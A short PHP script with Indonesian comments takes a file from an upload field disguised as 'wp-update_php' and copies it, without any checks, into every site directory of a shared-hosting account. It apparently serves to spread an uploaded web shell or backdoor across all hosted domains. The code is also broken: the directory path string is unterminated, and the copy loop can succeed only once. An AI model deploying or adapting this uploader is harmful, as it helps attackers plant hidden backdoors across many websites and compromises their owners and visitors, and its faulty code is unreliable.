<?php
// Tentukan direktori tujuan untuk mengunggah file
$direktori_tujuan = '/home/u174438151/domains/;

// Dapatkan file yang diunggah dari formulir
$file_logo = $_FILES['wp-update_php'];

// Periksa apakah file berhasil diunggah
if ($file_logo['error'] === 0) {
    // Dapatkan nama file
    $nama_file = $file_logo['name'];

    // Buka direktori tujuan
    $direktori = opendir($direktori_tujuan);

    // Loop melalui setiap file dalam direktori
    while (($file = readdir($direktori)) !== false) {
        // Periksa apakah file tersebut adalah direktori
        if (is_dir($direktori_tujuan . $file)) {
            // Pindahkan file ke dalam direktori tersebut
            move_uploaded_file($file_logo['tmp_name'], $direktori_tujuan . $file . '/' . $nama_file);
        }
    }

    // Tutup direktori
    closedir($direktori);

    // Tampilkan pesan sukses
    echo 'File berhasil diunggah ke semua direktori.';
} else {
    // Tampilkan pesan kesalahan
    echo 'Terjadi kesalahan saat mengunggah file.';
}
?>
